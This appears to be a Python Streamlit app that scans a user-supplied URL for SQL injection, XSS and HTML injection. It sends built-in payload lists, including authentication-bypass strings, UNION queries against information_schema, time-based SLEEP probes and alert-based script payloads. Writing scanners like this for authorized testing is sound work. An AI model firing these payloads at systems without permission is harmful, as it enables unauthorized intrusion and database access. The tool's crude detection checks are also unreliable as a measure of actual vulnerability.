import streamlit as st
import re
import requests
import pandas as pd
from urllib.parse import urljoin, urlparse
import html
from bs4 import BeautifulSoup

# Page configuration
st.set_page_config(
    page_title="Web Security Testing Platform",
    page_icon="🔒",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Custom CSS for hacker theme
st.markdown("""
    <style>
    .main {
        background-color: #0E1117;
        color: #00FF00;
    }
    .stButton>button {
        color: #00FF00;
        background-color: #1E1E1E;
        border: 2px solid #00FF00;
    }
    .stTextInput>div>div>input {
        color: #00FF00;
        background-color: #1E1E1E;
    }
    </style>
    """, unsafe_allow_html=True)

# Sidebar navigation
st.sidebar.title("🔒 Web Security Scanner")
page = st.sidebar.selectbox(
    "Choose Scanner",
    ["Home", "SQL Injection Scanner", "XSS Scanner", "HTML Injection Scanner"]
)

# Home page
if page == "Home":
    st.title("🔐 Web Security Testing Platform")
    st.markdown("""
    ### Advanced Web Vulnerability Scanner
    This platform provides tools for testing:
    - SQL Injection vulnerabilities
    - Cross-Site Scripting (XSS) vulnerabilities
    - HTML Injection vulnerabilities
    
    ⚠️ **Disclaimer**: Use these tools only on systems you own or have explicit permission to test.
    """)

# SQL Injection Scanner
elif page == "SQL Injection Scanner":
    st.title("💉 Advanced SQL Injection Scanner")
    
    # Input fields
    url = st.text_input("Target URL")
    param = st.text_input("Parameter to test (e.g., id, user, etc.)")
    
    # Advanced SQL injection payloads
    sql_payloads = {
        "Authentication Bypass": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "') OR ('1'='1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' OR '1'='1' LIMIT 1 --"
        ],
        "Union Based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION ALL SELECT column_name,NULL FROM information_schema.columns--"
        ],
        "Error Based": [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))foo)--",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))foo)--",
            "') AND SLEEP(5)--",
            "' AND (SELECT 2*3) < (SELECT * FROM (SELECT(SLEEP(5)))foo)--"
        ],
        "Blind SQL": [
            "' AND SLEEP(5)--",
            "' AND IF(1=1, SLEEP(5), 0)--",
            "' AND '1'='1' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND 1=(SELECT COUNT(*) FROM tabname); WAITFOR DELAY '0:0:5'--"
        ]
    }
    
    if url and param:
        if st.button("Start SQL Injection Scan"):
            st.write("🔍 Starting SQL Injection scan...")
            
            # Results storage
            results = []
            
            # Progress bar
            progress_bar = st.progress(0)
            total_payloads = sum(len(payloads) for payloads in sql_payloads.values())
            current_payload = 0
            
            # Test each category
            for category, payloads in sql_payloads.items():
                st.subheader(f"Testing {category} Injections")
                
                for payload in payloads:
                    # Update progress
                    current_payload += 1
                    progress_bar.progress(current_payload / total_payloads)
                    
                    # Create test URL
                    test_url = f"{url}{'?' if '?' not in url else '&'}{param}={payload}"
                    
                    try:
                        # Send request
                        response = requests.get(test_url, timeout=5)
                        
                        # Analyze response
                        suspicious = False
                        reason = []
                        
                        # Check status code
                        if response.status_code != 200:
                            suspicious = True
                            reason.append(f"Non-200 status code: {response.status_code}")
                        
                        # Check for SQL errors
                        sql_errors = [
                            "sql syntax", "mysql error", "postgresql error",
                            "oracle error", "sql server error", "syntax error"
                        ]
                        if any(error in response.text.lower() for error in sql_errors):
                            suspicious = True
                            reason.append("SQL error in response")
                        
                        # Check response time (for time-based injections)
                        if response.elapsed.total_seconds() > 4:
                            suspicious = True
                            reason.append("Long response time (possible time-based vulnerability)")
                        
                        results.append({
                            "Category": category,
                            "Payload": payload,
                            "Suspicious": "⚠️ Yes" if suspicious else "✅ No",
                            "Reason": ", ".join(reason) if reason else "N/A"
                        })
                        
                    except Exception as e:
                        results.append({
                            "Category": category,
                            "Payload": payload,
                            "Suspicious": "❌ Error",
                            "Reason": str(e)
                        })
            
            # Display results
            st.subheader("Scan Results")
            df = pd.DataFrame(results)
            st.dataframe(df)
            
            # Export results
            csv = df.to_csv(index=False)
            st.download_button(
                label="Download Results",
                data=csv,
                file_name="sql_injection_results.csv",
                mime="text/csv"
            )

# XSS Scanner
elif page == "XSS Scanner":
    st.title("⚔️ XSS Vulnerability Scanner")
    
    url = st.text_input("Target URL")
    param = st.text_input("Parameter to test")
    
    xss_payloads = {
        "Basic XSS": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ],
        "Event Handlers": [
            "' onmouseover='alert(1)",
            "\" onmouseover=\"alert(1)",
            "' onfocus='alert(1)",
            "<body onload=alert('XSS')>"
        ],
        "HTML Attribute Break-outs": [
            "\" autofocus onfocus=alert(1) x=\"",
            "' autofocus onfocus=alert(1) x='",
            "\"><img src=x onerror=alert('XSS')><\"",
            "'><img src=x onerror=alert('XSS')><'"
        ],
        "Encoded XSS": [
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"
        ]
    }
    
    if url and param:
        if st.button("Start XSS Scan"):
            st.write("🔍 Starting XSS scan...")
            
            results = []
            progress_bar = st.progress(0)
            total_payloads = sum(len(payloads) for payloads in xss_payloads.values())
            current_payload = 0
            
            for category, payloads in xss_payloads.items():
                st.subheader(f"Testing {category}")
                
                for payload in payloads:
                    current_payload += 1
                    progress_bar.progress(current_payload / total_payloads)
                    
                    test_url = f"{url}{'?' if '?' not in url else '&'}{param}={payload}"
                    
                    try:
                        response = requests.get(test_url, timeout=5)
                        
                        # Check if payload is reflected
                        payload_encoded = html.escape(payload)
                        reflected = payload in response.text or payload_encoded in response.text
                        
                        # Check for XSS filters
                        filtered = False
                        if reflected:
                            soup = BeautifulSoup(response.text, 'html.parser')
                            # Check if payload is inside script tags or event handlers
                            script_tags = soup.find_all('script')
                            for script in script_tags:
                                if payload in str(script):
                                    filtered = True
                                    break
                        
                        results.append({
                            "Category": category,
                            "Payload": payload,
                            "Reflected": "⚠️ Yes" if reflected else "✅ No",
                            "Filtered": "⚠️ Yes" if filtered else "✅ No",
                            "Status": response.status_code
                        })
                        
                    except Exception as e:
                        results.append({
                            "Category": category,
                            "Payload": payload,
                            "Reflected": "❌ Error",
                            "Filtered": "❌ Error",
                            "Status": str(e)
                        })
            
            st.subheader("Scan Results")
            df = pd.DataFrame(results)
            st.dataframe(df)
            
            # Export results
            csv = df.to_csv(index=False)
            st.download_button(
                label="Download Results",
                data=csv,
                file_name="xss_scan_results.csv",
                mime="text/csv"
            )

# HTML Injection Scanner
elif page == "HTML Injection Scanner":
    st.title("🏷️ HTML Injection Scanner")
    
    url = st.text_input("Target URL")
    param = st.text_input("Parameter to test")
    
    html_payloads = {
        "Basic HTML": [
            "<h1>Test</h1>",
            "<div>Test</div>",
            "<p>Test</p>",
            "<br>Test</br>"
        ],
        "HTML with Attributes": [
            "<div class='test'>Test</div>",
            "<p style='color:red'>Test</p>",
            "<span id='test'>Test</span>",
            "<div title='test'>Test</div>"
        ],
        "Form Elements": [
            "<form action='#'>Test</form>",
            "<input type='text' value='test'>",
            "<textarea>Test</textarea>",
            "<select><option>Test</option></select>"
        ],
        "HTML5 Elements": [
            "<article>Test</article>",
            "<section>Test</section>",
            "<nav>Test</nav>",
            "<aside>Test</aside>"
        ]
    }
    
    if url and param:
        if st.button("Start HTML Injection Scan"):
            st.write("🔍 Starting HTML Injection scan...")
            
            results = []
            progress_bar = st.progress(0)
            total_payloads = sum(len(payloads) for payloads in html_payloads.values())
            current_payload = 0
            
            for category, payloads in html_payloads.items():
                st.subheader(f"Testing {category}")
                
                for payload in payloads:
                    current_payload += 1
                    progress_bar.progress(current_payload / total_payloads)
                    
                    test_url = f"{url}{'?' if '?' not in url else '&'}{param}={payload}"
                    
                    try:
                        response = requests.get(test_url, timeout=5)
                        
                        # Check if payload is reflected
                        payload_encoded = html.escape(payload)
                        reflected = payload in response.text
                        
                        # Check if HTML is rendered
                        soup = BeautifulSoup(response.text, 'html.parser')
                        rendered = False
                        
                        if reflected:
                            # Check if the HTML structure is preserved
                            test_soup = BeautifulSoup(payload, 'html.parser')
                            original_tags = [tag.name for tag in test_soup.find_all()]
                            
                            for tag in original_tags:
                                if soup.find(tag):
                                    rendered = True
                                    break
                        
                        results.append({
                            "Category": category,
                            "Payload": payload,
                            "Reflected": "⚠️ Yes" if reflected else "✅ No",
                            "Rendered": "⚠️ Yes" if rendered else "✅ No",
                            "Status": response.status_code
                        })
                        
                    except Exception as e:
                        results.append({
                            "Category": category,
                            "Payload": payload,
                            "Reflected": "❌ Error",
                            "Rendered": "❌ Error",
                            "Status": str(e)
                        })
            
            st.subheader("Scan Results")
            df = pd.DataFrame(results)
            st.dataframe(df)
            
            # Export results
            csv = df.to_csv(index=False)
            st.download_button(
                label="Download Results",
                data=csv,
                file_name="html_injection_results.csv",
                mime="text/csv"
            )

# Footer
st.markdown("---")
st.markdown("Created for educational purposes only. Use responsibly.")